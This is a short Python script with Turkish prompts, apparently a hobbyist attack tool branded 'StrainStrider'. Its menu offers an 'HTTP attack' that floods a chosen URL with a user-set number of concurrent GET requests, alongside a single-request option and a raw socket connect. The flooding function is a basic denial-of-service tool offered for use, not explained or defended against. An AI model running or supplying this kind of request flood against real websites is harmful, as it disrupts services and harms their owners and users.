import time
import platform
import requests
import socket
import os
import colorama
from concurrent.futures import ThreadPoolExecutor

colorama.init()

def platform_belirle():
    sistem = platform.system()
    if sistem == "Darwin":
        os.system("clear")
    elif sistem == "Windows":
        os.system("cls")

def soket_kur(ip, port):
    try:
        soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soket.connect((ip, port))
        print(colorama.Fore.GREEN + "[*] Soket kurma başarılı!")
        time.sleep(2)
        exit()
    except ConnectionError as e:
        print(colorama.Fore.RED + f"[-] Bir Hata Oluştu {e}")

def http_istegi(url, istek):
    try:
            response = requests.get(url, istek)
            if response.status_code == 200:
                print(colorama.Fore.GREEN + "[*] İstek Başarılı")
            elif response.status_code == 400:
                print(colorama.Fore.RED + "[-] İstek Başarısız")
    except requests.ConnectionError:
        print(colorama.Fore.RED + "[-] Bağlantı Kurulamadı")

def http_atagi(url, istek, kisi, sayi):
    with ThreadPoolExecutor(max_workers=kisi) as executor:
        for _ in range(sayi):
            executor.submit(http_istegi, url, istek)

def banner_ve_logo():
    platform_belirle()
    print(colorama.Fore.CYAN + """

    

  ____  _             _       ____  _        _     _           
 / ___|| |_ _ __ __ _(_)_ __ / ___|| |_ _ __(_) __| | ___ _ __ 
 \___ \| __| '__/ _` | | '_ \\___ \| __| '__| |/ _` |/ _ \ '__|
  ___) | |_| | | (_| | | | | |_ __) | |_| |  | | (_| |  __/ |   
 |____/ \__|_|  \__,_|_|_| |_|____/ \__|_|  |_|\__,_|\___|_|   
                                                               
                                 

                  
          """, colorama.Fore.WHITE + """
          tarafından oluşturuldu: @oxcanga
          -------------------------------
          HTTP atağı için (1)
          HTTP isteği için (2)
          Soket Kurmak için (3)

          -------------------------------

          """)
    giris = int(input("Bir seçenek giriniz > "))

    if giris == 3:
        ip = input("IP adresi giriniz > ")
        port = int(input("Port giriniz > \n"))
        soket_kur(ip=ip, port=port)
    if giris == 1:
        url = input("URL Giriniz > ")
        istek = input("Gönderilecek isteği giriniz > ")
        kisi = int(input("Aynı anda kaç kişi istek gönderecek > "))
        sayi = int(input("Kaç Tane istek gönderilecek > "))
        http_atagi(url=url, istek=istek, kisi=kisi, sayi=sayi)
    if giris == 2:
        url = input("URL Giriniz > ")
        istek = input("Gönderilecek isteği giriniz > ")
        http_istegi(url=url, istek=istek)

banner_ve_logo()